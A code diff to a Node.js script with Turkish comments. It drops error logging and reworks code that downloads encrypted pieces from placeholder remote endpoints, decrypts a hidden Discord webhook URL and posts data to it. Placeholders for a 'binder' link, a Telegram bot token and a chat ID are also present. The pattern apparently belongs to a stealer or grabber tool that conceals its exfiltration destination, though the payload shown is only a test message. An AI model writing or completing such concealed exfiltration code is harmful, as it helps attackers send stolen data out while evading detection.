@@ -28,22 +28,8 @@ const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
 
-// Global değişken tanımlama
 let discordWebhookUrl = null;
-
-function logError(errorMessage) {
-    const logFilePath = path.join(__dirname, 'error_log.txt'); // Hataları kaydedeceğimiz dosyanın yolu
-    const timestamp = new Date().toISOString(); // Hata zaman damgası
-    const formattedMessage = `[${timestamp}] - ${errorMessage}\n`;
-
-    fs.appendFile(logFilePath, formattedMessage, (err) => {
-        if (err) {
-            console.error("Hata kaydedilirken bir sorun oluştu:", err);
-        } else {
-            console.log("Hata başarıyla kaydedildi.");
-        }
-    });
-}
+let basewebhookurl = 'REMPLACE-ME-OC';
 
 async function decryptText(encryptedBase64, ivBase64, keyBase64) {
     const encryptedArray = base64ToArrayBuffer(encryptedBase64);
@@ -85,14 +71,11 @@ async function fetchData(url) {
         const response = await axios.get(url);
         return response.data; // Axios'da text() yerine data döner
     } catch (error) {
-        const errorMessage = `Veri alınırken hata oluştu: ${error.message}`;
-        logError(errorMessage);  // Hata kaydını yap
-        console.error(errorMessage);
+        console.error("Veri alınırken hata oluştu:", error);
     }
 }
 
 async function fetchAndDecrypt() {
-    const basewebhookurl = 'REMPLACE-ME-OC'; // Kullanılacak base URL
 
     const encryptedUrl = `${basewebhookurl}/jacob`;
     const ivUrl = `${basewebhookurl}/mayo`;
@@ -105,17 +88,13 @@ async function fetchAndDecrypt() {
 
         if (encryptedBase64 && ivBase64 && keyBase64) {
             const decryptedUrl = await decryptText(encryptedBase64, ivBase64, keyBase64);
-            discordWebhookUrl = decryptedUrl; // Webhook URL'yi güncelle
+            discordWebhookUrl = decryptedUrl; // Global değişkeni güncelle
             console.log("Webhook URL çözüldü ve kaydedildi:", discordWebhookUrl);
         } else {
-            const errorMessage = "Gerekli veriler alınamadı.";
-            logError(errorMessage);  // Hata kaydını yap
-            console.error(errorMessage);
+            console.error("Gerekli veriler alınamadı.");
         }
     } catch (error) {
-        const errorMessage = `Bir hata oluştu: ${error.message}`;
-        logError(errorMessage);  // Hata kaydını yap
-        console.error(errorMessage);
+        console.error("Bir hata oluştu:", error);
     }
 }
 
@@ -125,12 +104,12 @@ async function fetchAndDecrypt() {
 
     if (discordWebhookUrl) {
         console.log("Webhook URL kullanıma hazır:", discordWebhookUrl);
-        const payload = { content: "Mesaj içeriği" };
+        const payload = {
+            content: "Mesaj içeriği"
+        };
         await sendWebhook(payload);
     } else {
-        const errorMessage = "Webhook URL alınamadı.";
-        logError(errorMessage);  // Hata kaydını yap
-        console.error(errorMessage);
+        console.error("Webhook URL alınamadı.");
     }
 })();
 
@@ -141,14 +120,10 @@ async function sendWebhook(payload) {
             await axios.post(discordWebhookUrl, payload);
             console.log('Webhook gönderildi');
         } catch (error) {
-            const errorMessage = `Webhook gönderilirken hata oluştu: ${error.message}`;
-            logError(errorMessage);  // Hata kaydını yap
-            console.error(errorMessage);
+            console.error(`Webhook gönderilirken hata oluştu: ${error.message}`);
         }
     } else {
-        const errorMessage = "Webhook URL henüz tanımlanmadı.";
-        logError(errorMessage);  // Hata kaydını yap
-        console.error(errorMessage);
+        console.error("Webhook URL henüz tanımlanmadı.");
     }
 }
 
